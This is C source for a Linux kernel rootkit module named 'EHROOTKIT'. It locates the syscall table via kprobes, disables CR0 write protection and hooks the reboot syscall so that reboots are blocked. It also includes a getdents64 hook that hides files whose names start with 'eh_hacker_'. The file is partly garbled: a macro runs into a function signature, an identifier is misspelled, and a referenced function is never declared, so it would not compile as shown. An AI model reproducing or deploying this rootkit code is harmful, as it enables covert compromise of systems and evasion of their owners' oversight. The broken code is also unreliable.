  #include <linux/module.h>
  #include <linux/init.h>
  #include <linux/kernel.h>
  #include <linux/kprobes.h>
  #include <linux/syscalls.h>
  
  
  // Manually set the write bit
  static void my_write_cr0(long value) {
      __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
  }
  
  #define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
  #define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))
  #define enable_reboot 0

unsigned long *sys_call_table_address;
  asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);
  
  static struct kprobe kp = {
      .symbol_name = "kallsyms_lookup_name"
  };
  
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  unsigned long * get_system_call_table_address(void){
      kallsyms_lookup_name_t kallsyms_lookup_name;
      register_kprobe(&kp);
      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
      unregister_kprobe(&kp);
  unsigned long *address = (unsigned long*)kallsyms_lookup_name("sys_call_table");
      return address;
  }
  
  asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg){
      if(enable_reboot){
         return old_reboot_sys_call(magic1, magic2, cmd, arg);
      }
      printk(KERN_NOTICE "EHROOTKIT: Blocked reboot Call");
      return EPERM;
  }
    void hook_sys_call(void){
      old_reboot_sys_call = sys_call_table_address[__NR_reboot];
      disable_write_protection();
      sys_call_table_address[__NR_reboot] = (unsigned long) hackers_reboot;
      enable_write_protection();
      printk(KERN_NOTICE "EHROOTKIT: Hooked reboot Call");
  
  }
    void restore_reboot_sys_call(void){
      disable_write_protection();
      sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;
      enable_write_protection();
  }
  
  static int startup(void){
      sys_call_table_address = get_system_call_table_address();
      hook_sys_call();
      return 0;
  }
  static void __exit shutdown(void){
     restore_reboot_sys_call();
  }
  
#define PREFIX "eh_hacker_"
#define PREFIX_LEN 10asmlinkage hacker_getdents64( unsigned int fd, struct linux_dirent64 *dirp,
    
			
			 unsigned int count){  int num_bytes = old_getdents64(fd,dirp, count);
   struct linux_dirent64* entry = NULL;
   int offset = 0;  while( offset < num_bytes){
       unsigned long entry_addr = drip + offset;

entry = (struct linux_dirent*) entry_addr;
      if (strncmp(entry->d_name, PREFIX, PREFIX_LEN) != 0){
               offset += entry->d_reclen;
        }else{
            size_t bytes_remaining = num_bytes - (offset + entry->d_reclen);
             memcpy(entry_addr, entry_addr + entry->d_reclen, bytes_remaining);
             num_bytes -= entry->d_reclen;
             count -= 1;
        }
    }
    return num_bytes;
}
  module_init(startup);
  module_exit(shutdown);
  MODULE_LICENSE("GPL");
